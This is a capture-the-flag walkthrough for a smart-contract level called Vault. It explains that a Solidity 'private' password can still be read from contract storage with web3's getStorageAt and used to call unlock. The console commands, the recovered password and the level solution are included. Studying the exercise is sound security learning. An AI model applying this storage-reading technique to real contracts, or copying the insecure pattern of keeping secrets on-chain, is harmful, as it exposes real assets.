# Vault

>Unlock the vault to pass the level!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

On analyizing the above contract, we observe that our goal is to call the function unlock with the right password as argument so that the boolean variable is set to false.
But this password variable is declared as `private`.

```solidity
 bytes32 private password;
```

State variables in solidity have three possible visibility modifiers i.e. `public`, `internal` or `private`.
private variables are only accessible within the contract in which they were declared. Calling them is thus, also not possible.

So,

What can we do to be able to read this private variable?

When a contract is deployed, the Ethereum Virtual Machine (EVM) allocates a specific amount of storage to the contract based on its size. Storage is divided into slots, each of which can store 256 bits (32 bytes) of data.
This contract storage consists of all the variables declared inside the contract irrespective of their visibility(`public` or `private`).

The web3 js library provides the function `web3.eth.getStorageAt(contract-address, storage-slot)` to serve this purpose.

Analyzing the contract storage, (I am using the browser console for this.)

```javascript
await web3.eth.getStorageAt("0x6D677CBBD80856656CD2A8e9C889E41fc8Eb421B", 0)
```
we get

```
'0x0000000000000000000000000000000000000000000000000000000000000001'
```
which corresponds to the locked variable `bool public locked` which is currently set to `true`. Now accessing the value of the variable password stored at slot 1.

```javascript
await web3.eth.getStorageAt("0x6D677CBBD80856656CD2A8e9C889E41fc8Eb421B", 1)
```
we get the value of the password variable.

Now, we call the function `unlock` with this value,

```javascript
await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
```

After confirming that the value of locked is now set to `false`, we can submit the instance.
